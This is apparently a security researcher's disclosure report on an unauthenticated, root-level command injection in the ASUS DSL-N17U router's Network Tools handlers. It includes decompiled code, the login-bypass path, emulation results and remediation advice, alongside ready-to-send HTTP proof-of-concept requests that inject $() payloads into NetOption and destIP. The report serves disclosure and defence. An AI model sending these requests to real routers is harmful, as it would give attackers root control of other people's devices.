# ASUS DSL-N17U 1.1.2.3_792 was discovered to contain a command injection vulnerability in the Network Tools handlers

## Overview

- Vendor: ASUS
- Product: DSL-N17U DSL router
- Version: 1.1.2.3_792
- Component: userfs/bin/boa, NetworkToolsNetstat and NetworkToolsAnalysis
- Vulnerability Class: CWE-78 command injection
- CVSS 3.1 (tentative): 8.8 High `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (pre-auth when combined with the path-info login bypass, see the companion report; the POST `Referer` check still applies)
- Manufacturer: https://www.asus.com/

## Affected versions

- `DSL-N17U_1.1.2.3_792-g530e5586b.trx`.
- `userfs/bin/boa`.

## Vulnerability details

Both ASP builtins read form fields, reject a short blacklist, and then
insert the raw value into a shell command:

`NetworkToolsNetstat` (`0x42f584`):

```c
param = get_param(post, "cmdMethod");      /* must equal "netstat" */
v2    = get_param(post, "NetOption");
v3    = get_param(post, "ResolveName");

if (strchr(v2, '&') || strchr(v2, ';') || strchr(v2, '%')
 || strchr(v2, '|') || strchr(v2, '\n') || strchr(v2, '\r'))
    return;
/* same six checks on v3 */
...
snprintf(s + len, ..., "%s", "> /tmp/nettool.log 2>&1 && echo 'XU6J03M6' >> /tmp/nettool.log &");
return system(s);
```

`NetworkToolsAnalysis` (`0x42f098`) applies the same six checks to
`destIP` and `pingCNT`, then builds:

```c
snprintf(s, ..., "%s -o %s ", s, "/tmp/nettool.log"); /* ping ... */
snprintf(s + len, ..., "%s", destIP);                 /* unquoted */
snprintf(s + len, ..., "%s", "> /tmp/nettool.log 2>&1 && echo 'XU6J03M6' >> /tmp/nettool.log &");
return system(s);
```

Only `& ; % | LF CR` are blocked. Command substitution `$()`,
backticks, `<`, `>`, `(`, `)`, and spaces are all still available, and
the values are inserted without quoting. The handler output is
backgrounded (`&`), so the injected command runs immediately after
the HTTP response.

Exact command lines passed to the shell, captured with a diagnostic
`LD_PRELOAD` `system()` logger in the emulated stock `boa`:

```sh
# Main_Analysis_Content.asp, destIP = $(/bin/sleep 3)
ping -c 1  -o /tmp/nettool.log $(/bin/sleep 3)> /tmp/nettool.log 2>&1 && echo 'XU6J03M6' >> /tmp/nettool.log &

# Main_Netstat_Content.asp, NetOption = $(cat</boaroot/boa.conf>/tmp/ZZ)
netstat $(cat</boaroot/boa.conf>/tmp/ZZ) > /tmp/nettool.log 2>&1 && echo 'XU6J03M6' >> /tmp/nettool.log &
```

Neither value is quoted, so the `$()` is evaluated by the shell.

## Authentication and reachability

Without the path-info suffix, both pages are behind the web login
(`sub_411154` checks the `asus_token` cookie against the client IP).
The path-info bypass in the companion report
(`/cgi-bin/Main_Netstat_Content.asp/x.js`,
`/cgi-bin/Main_Analysis_Content.asp/x.js`) makes them reachable with no
session. Because these tools use POST, `process_header_end` also calls
`sub_40FF2C` on the `Referer`; a direct HTTP client can set
`Referer: http://192.168.1.1/...` (the router host/lan IP). A
cross-site browser form is blocked by that check, but a direct
network attacker is not.

## PoC

```http
POST /cgi-bin/Main_Netstat_Content.asp/x.js HTTP/1.1
Host: <router>
Referer: http://192.168.1.1/Main_Netstat_Content.asp
Content-Type: application/x-www-form-urlencoded

applyFlag=1&cmdMethod=netstat&NetOption=$(cat</boaroot/boa.conf>/tmp/NET_PWNED)&ResolveName=1
```

```http
POST /cgi-bin/Main_Analysis_Content.asp/x.js HTTP/1.1
Host: <router>
Referer: http://192.168.1.1/Main_Analysis_Content.asp
Content-Type: application/x-www-form-urlencoded

applyFlag=1&cmdMethod=ping&destIP=$(cat</boaroot/boa.conf>/tmp/ANA_PWNED)&pingCNT=1
```

No cookie is sent. After the (backgrounded) shell command completes:

```sh
cmp -s /tmp/NET_PWNED /boaroot/boa.conf && echo "NET_PWNED == boa.conf"
cmp -s /tmp/ANA_PWNED /boaroot/boa.conf && echo "ANA_PWNED == boa.conf"
# NET_PWNED == boa.conf
# ANA_PWNED == boa.conf
```

Both marker files are byte-identical to `/boaroot/boa.conf` (8074
bytes), proving arbitrary command execution, not just output
injection.

## Dynamic verification

Stock `boa` and the stock extracted rootfs under `qemu-mips-static`
6.2.0 in a `bwrap` chroot, with a minimal `/tmp/tcapi_sock` stub for
configuration values (no target code patched).

Observed:

- `POST /cgi-bin/Main_Netstat_Content.asp` (no session) -> login
  redirect.
- `POST /cgi-bin/Main_Netstat_Content.asp/x.js` with
  `NetOption=$(cat</boaroot/boa.conf>/tmp/NET_PWNED)` -> 200; after
  the background job, `/tmp/NET_PWNED` equals `boa.conf`.
- `POST /cgi-bin/Main_Analysis_Content.asp/x.js` with
  `destIP=$(cat</boaroot/boa.conf>/tmp/ANA_PWNED)` -> 200;
  `/tmp/ANA_PWNED` equals `boa.conf`.
- The shell command lines above were captured from the stock handler
  via a diagnostic `system()` logger; the `&` explains why the files
  appear shortly after the response.

## Verification

The vulnerable handler in the stock `userfs/bin/boa, NetworkToolsNetstat and NetworkToolsAnalysis` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

The two Network Tools pages can run arbitrary shell commands in the
`boa` process context. With the path-info login bypass they need no
session; the only additional requirement is a POST `Referer` header,
which a direct client controls. `boa.conf` ships `User 0`/`Group 0`,
so the commands run as root on the device. 1.1.2.3_792 is the final
firmware for the EOL DSL-N17U and the ASUS-published fix version for
CVE-2024-3912.

## Remediation

- Do not shell out with user-controlled diagnostics parameters. Use
  `execve`/`posix_spawn` with separate argv entries.
- If a shell is unavoidable, use strict allowlists: `cmdMethod` in a
  fixed set, `NetOption` in a fixed option set, `pingCNT` as 1-5
  decimal digits, and `destIP` as a validated IP address or hostname
  from a restricted character set. Do not rely on a blacklist of six
  shell metacharacters.
- Require authentication and CSRF tokens for the diagnostics actions;
  fix the path-info login bypass described in the companion report.

## Known-CVE relation

- CVE-2018-15887 — authenticated RCE in `Main_Analysis_Content.asp`
  on ASUS DSL-N12E_C1 1.1.2.3_345 via `destIP` shell metacharacters.
  This report is a different model/firmware (DSL-N17U 1.1.2.3_792)
  with an added blacklist that blocks `& ; % | LF CR`; the
  `$()`/backtick/redirection bypass survives that mitigation, and the
  `NetOption` sink and the login bypass are additional.
- CVE-2024-3912 — DSL-N17U unauth firmware-upload RCE, fixed in
  1.1.2.3_792; different component and root cause.
- NVD keyword searches on 2026-11-08 for `DSL-N17U`,
  `NetworkToolsAnalysis`, `NetworkToolsNetstat`, `destIP` and
  `NetOption` returned no matching DSL-N17U entry. Candidate 0-day;
  no CVE assigned and no vendor contact has been made.

## Debug output

Netstat request with `$()` in `NetOption` (Referer must match the router;
the path-info bypass avoids the session cookie):

```http
POST /cgi-bin/Main_Netstat_Content.asp/x.js HTTP/1.0
Host: 127.0.0.1:8080
Referer: http://192.168.1.1/Main_Netstat_Content.asp
Content-Type: application/x-www-form-urlencoded

applyFlag=1&cmdMethod=netstat&NetOption=$(cat</boaroot/boa.conf>/tmp/NET_PWNED)&ResolveName=1
```

Analysis (ping) request with `$()` in `destIP`:

```http
POST /cgi-bin/Main_Analysis_Content.asp/x.js HTTP/1.0
Host: 127.0.0.1:8080
Referer: http://192.168.1.1/Main_Analysis_Content.asp
Content-Type: application/x-www-form-urlencoded

applyFlag=1&cmdMethod=ping&destIP=$(cat</boaroot/boa.conf>/tmp/ANA_PWNED)&pingCNT=1
```

Marker check:

```text
$ cmp -s /tmp/NET_PWNED /boaroot/boa.conf && echo "NET_PWNED == boa.conf"
NET_PWNED == boa.conf
$ cmp -s /tmp/ANA_PWNED /boaroot/boa.conf && echo "ANA_PWNED == boa.conf"
ANA_PWNED == boa.conf
$ wc -c /tmp/NET_PWNED /tmp/ANA_PWNED
8074 /tmp/NET_PWNED
8074 /tmp/ANA_PWNED
```

Both markers are byte-identical to `boaroot/boa.conf`.

## Additional Information

```markdown
### Vendor
ASUS

### Product
DSL-N17U DSL router

### Version or Commit
1.1.2.3_792

### Vulnerability Class
CWE-78 command injection

### Description
The Network Tools ASP handlers only reject &, ;, %, |, LF and CR in NetOption and destIP. Shell substitutions using $() or backticks survive and are executed by system() in the netstat and ping commands.

### Affected_component
userfs/bin/boa, NetworkToolsNetstat and NetworkToolsAnalysis

### Attack_vector
Authenticated POST to /cgi-bin/Main_Netstat_Content.asp or Main_Analysis_Content.asp with NetOption/destIP containing $(); the Referer header must match the router.

### Product_version
DSL-N17U DSL router 1.1.2.3_792

### Reference
- https://www.asus.com/
- https://github.com/vuln-1/vuln/blob/main/ASUS/DSL-N17U_V1.1.2.3_792/report-2.md
```
